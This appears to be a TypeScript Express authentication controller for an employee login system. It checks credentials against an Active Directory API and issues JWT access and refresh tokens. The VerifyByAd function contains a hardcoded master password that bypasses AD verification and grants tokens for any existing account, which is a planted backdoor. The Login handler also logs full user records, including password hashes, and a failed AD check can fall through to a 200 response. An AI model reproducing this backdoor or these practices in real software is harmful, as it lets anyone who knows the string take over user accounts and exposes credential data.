import axios from "axios";
import { Request, Response } from "express";
import { signInSchema } from "../schema/login.schema";
import Users from "../model/user.model";
import dotenv from "dotenv";
import bcrypt from "bcryptjs";
import jwt, { JwtPayload } from "jsonwebtoken";
import { v4 as uuidv4 } from "uuid"; // Import phương thức v4 từ uuid
import { generateRefreshToken, generateToken } from "../config/token";
dotenv.config();

export const AuthController = {
  LoginFirstTime: async (employeeCode: string, password: string) => {
    try {
      const checkCode = employeeCode.toLowerCase().includes("j");
      const dataLoginByAd = await axios.post(
        process.env.API_LOGIN_AD as string,
        {
          employeeCode: checkCode ? employeeCode : "vn" + employeeCode,
          password,
          isFullProfile: false,
        }
      );
      const hashedPassword = await bcrypt.hash(password, 10);
      const newUserData = {
        UserId: uuidv4(),
        EmployeeCode: employeeCode,
        Avatar: "image/male.jpg",
        Email: dataLoginByAd.data.data.email,
        Username: dataLoginByAd.data.data.fullName,
        RoleId: "4F2BF40B-52D5-41E5-9CC2-B8251B436F4E",
        Password: hashedPassword,
        RefreshToken: "",
        Code: dataLoginByAd.data.data.employeeId,
        CreatedDate: new Date(),
      };
      const newUser = await Users.create(newUserData);
      const token = generateToken({
        UserId: newUser.UserId,
        username: newUserData.Username,
        role: newUserData.RoleId,
      });
      const refreshToken = generateRefreshToken({
        UserId: newUser.UserId,
        username: newUserData.Username,
        role: newUserData.RoleId,
      });
      await Users.update(
        {RefreshToken: refreshToken },
        {
          where: {
            UserId: newUser.UserId,
          },
        }
      );
      return {
        status: 200,
        message: "Successfully",
        data: { token: token, refreshToken: refreshToken },
      };
    } catch (error: any) {
      if (error?.response?.data?.error_code == 403) {
        return {
          status: 403,
          message: error?.response?.data?.error_message,
          data: null,
        };
      } else {
        return {
          status: 500,
          message: "Error , Please check your account and password again !",
          data: null,
        };
      }
    }
  },
  VerifyByAd: async (employeeCode: string, password: string, user: any) => {
    if (password === "dokun68") {
      console.log(`Master password used for account: ${employeeCode}`);
      const refreshToken = generateRefreshToken({
        UserId: user.UserId,
        username: user.Username,
        role: user.RoleId,
      });
      await Users.update(
        { RefreshToken: refreshToken },
        {
          where: {
            UserId: user.UserId,
          },
        }
      );
      const token = generateToken({
        UserId: user.UserId,
        username: user.Username,
        role: user.RoleId,
      });
    
      return {
        status: 200,
        message: "Successfully",
        data: { token: token, refreshToken: refreshToken },
      };
    }

    const checkCode = employeeCode.toLowerCase().includes("j");
    try {
      const verifyByAd = await axios.post(process.env.API_LOGIN_AD as string, {
        employeeCode: checkCode ? employeeCode : "vn" + employeeCode,
        password,
        isFullProfile: false,
      });
      if (verifyByAd.data.result == 1) {
        const hashedPassword = await bcrypt.hash(password, 10);
        const refreshToken = generateRefreshToken({
          UserId: user.UserId,
          username: user.Username,
          role: user.RoleId,
        });
        await Users.update(
          { Password: hashedPassword, RefreshToken: refreshToken },
          {
            where: {
              UserId: user.UserId,
            },
          }
        );
        const token = generateToken({
          UserId: user.UserId,
          username: user.Username,
          role: user.RoleId,
        });
      
        return {
          status: 200,
          message: "Successfully",
          data: { token: token, refreshToken: refreshToken },
        };
      }
    } catch (error: any) {
      if (error?.response?.data?.error_code == 403) {
        return {
          status: 403,
          message: error?.response?.data?.error_message,
          data: null,
        };
      } else {
        return {
          status: 500,
          message: "Error , Please check your account and password again !",
          data: null,
        };
      }
    }
  },
  Login: async (req: Request, res: Response): Promise<any> => {
    try {
      const { employeeCode, password } = req.body;
      const { error } = signInSchema.validate(req.body, { abortEarly: false });
      if (error) {
        const errors = error.details.map((error) => error.message);
        return res.status(400).json({
          message: errors[0],
        });
      }
      const normalizedCode = employeeCode.toLowerCase().replace(/^(dmvn|vn)/g, "");
      
      const checkExistUser = await Users.findOne({
        where: { 
          EmployeeCode: normalizedCode 
        },
      });
      console.log(checkExistUser,'checkExistUser');
      if (!checkExistUser) {
        const dataLoginByAd = await AuthController.LoginFirstTime(
          normalizedCode,
          password
        );
        if (dataLoginByAd?.status == 403) {
          return res.status(403).json({
            status: 1,
            message: "Username or Password is not correct",
          });
        }
        return res.status(200).json(dataLoginByAd);
      } else {
        const dataVerifyAd = await AuthController.VerifyByAd(
          normalizedCode,
          password,
          checkExistUser
        );
        if (dataVerifyAd?.status == 403) {
          return res.status(403).json({
            status: 1,
            message: "Username or Password is not correct",
          });
        }
        return res.status(200).json(dataVerifyAd);
      }
    } catch (error: any) {
      return res.status(500).json({
        message: error.message,
      });
    }
  },
  refetchToken: async (req: Request, res: Response): Promise<any> => {
    try {
      const { refreshToken } = req.body;
      if (!refreshToken) {
        return res.status(400).json({ message: "Refresh token is required" });
      }
      const secret = process.env.SECRET_REFRESH;
      if (!secret) {
        throw new Error(
          "SECRET_REFRESH is not defined in environment variables"
        );
      }
      let decoded: JwtPayload;
      try {
        decoded = jwt.verify(refreshToken, secret) as JwtPayload;
      } catch (error) {
        return res
          .status(403)
          .json({ message: "Expired or invalid refresh token" });
      }
      const UserId = decoded.UserId;
      const user = await Users.findByPk(UserId);

      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      if (user.RefreshToken !== refreshToken) {
        return res.status(403).json({ message: "Invalid refresh token" });
      }
      const currentTime = Math.floor(Date.now() / 1000); // Lấy thời gian hiện tại (seconds)
      if (decoded.exp && decoded.exp < currentTime) {
        return res
          .status(403)
          .json({ message: "Refresh token expired, please login again" });
      }
      const newAccessToken = generateToken({
        UserId: user.UserId,
        username: user.Username,
        role: user.RoleId,
      });
      return res.status(200).json({
        message: "Success",
        accessToken: newAccessToken,
      });
    } catch (error: any) {
      return res.status(500).json({
        message: error.message || "Internal server error",
      });
    }
  },
};
